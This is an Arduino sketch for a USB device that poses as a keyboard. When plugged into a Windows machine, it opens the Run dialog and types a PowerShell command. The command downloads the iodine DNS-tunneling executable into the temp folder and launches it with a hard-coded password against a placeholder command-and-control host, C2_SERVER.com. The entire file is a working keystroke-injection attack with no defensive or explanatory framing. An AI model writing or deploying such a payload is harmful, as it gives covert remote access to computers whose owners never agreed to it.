#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println(F("powershell Invoke-WebRequest -Uri https://github.com/yarrick/iodine/raw/master/win32/iodine.exe -OutFile $env:TEMP\\iodine.exe; $env:TEMP\\iodine.exe -f -P P@ssw0rd! C2_SERVER.com"));
}

void loop() {}
